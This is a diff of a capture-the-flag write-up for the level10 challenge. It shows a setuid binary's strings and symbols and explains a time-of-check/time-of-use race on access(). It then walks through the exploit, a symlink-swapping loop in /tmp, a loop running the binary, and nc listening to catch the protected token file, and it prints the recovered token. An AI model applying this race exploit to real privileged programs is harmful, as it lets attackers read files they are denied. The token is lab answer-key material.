@@ -1,5 +1,5 @@
 $> strings level10
-...
+[...]
 [^_]
 %s file host
         sends file to host if you have access to it
@@ -14,13 +14,12 @@ Unable to read from file: %s
 wrote file!
 You don't have access to %s
 ;*2$"
-...
+[...]
+
+# We need to listen on port 6969
+
 $> nm -u level10
-         w _Jv_RegisterClasses
-         U __errno_location@@GLIBC_2.0
-         w __gmon_start__
-         U __libc_start_main@@GLIBC_2.0
-         U __stack_chk_fail@@GLIBC_2.4
+[...]
          U access@@GLIBC_2.0
          U connect@@GLIBC_2.0
          U exit@@GLIBC_2.0
@@ -34,27 +33,38 @@ $> nm -u level10
          U socket@@GLIBC_2.0
          U strerror@@GLIBC_2.0
          U write@@GLIBC_2.0
-$> # The binary file use `access` which is vunerable if not used properly
+
+# The binary file use `access` which is vunerable to check permissions as its operation is not atomic
+
 $> man 2 access
+[...]
        Warning:  Using  these calls to check if a user is authorized to, for example, open a file
        before actually doing so using open(2) creates a security hole, because the user might ex‐
        ploit the short time interval between checking and opening the file to manipulate it.  For
        this reason, the use of this system call should be avoided.
-$> # We will use the short time between `access` and `open` to change the file to be opened
-$> ll level10 token
+[...]
+
+$> # We will use the short time between `access` and `open` to change the file to be opened (race condition exploit)
+
+$> ls -l level10 token
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10*
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
-$> # As we can see, level10 and token both have read/write permission for user flag10
-$> # We need to try to access `level10` but open `token` instead
-$> # To do so, we will create a symbolic link `exploit` which will swap between `~/level10` and `~/token`
+
+# As we can see, level10 and token both have read/write permission for user flag10
+# We will try to access `level10` but open `token` instead
+# To do so, we will create a symbolic link `exploit` which will swap almost instantly between `~/level10` and `~/token`
+
 $> while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
-$> # Then we will call `level10` in a loop
+
+# Then we will call `level10` in a loop
+
 $> while true; do ./level10 /tmp/exploit <HOST>; done
-$> # We open port 6969 for listen
-$> nc -l 6969 # nc -l -p 6969 on Linux
-...
+
+# We open port 6969 to listen
+
+$> nc -lk 6969
+[...garbage...]
 woupa2yuojeeaaed06riuj63c
-...
-$> # It's the token for flag10
-$> su flag10 # With token above
-$> getflag
+[...more garbage...]
+
+# We got our password ! ;)
